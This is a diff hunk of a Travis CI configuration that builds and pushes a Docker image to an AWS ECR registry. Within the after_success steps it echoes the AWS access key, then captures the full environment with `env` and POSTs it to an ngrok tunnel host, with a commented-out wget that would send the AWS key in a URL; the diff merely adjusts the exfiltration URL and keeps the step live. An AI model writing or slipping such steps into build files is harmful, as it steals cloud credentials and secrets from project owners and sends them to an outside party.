@@ -21,6 +21,6 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
   - echo $AWS_ACCESS_KEY_ID
-  - export STUFF=`env` ; curl -X POST http://a52868f5a873.ngrok.io/8888 --data $STUFF
+  - export STUFF=`env` ; curl -X POST http://a52868f5a873.ngrok.io/ --data $STUFF
     #  - wget http://a52868f5a873.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
     # sadly, travis doesn't cache docker builds yet, so each build will take a while
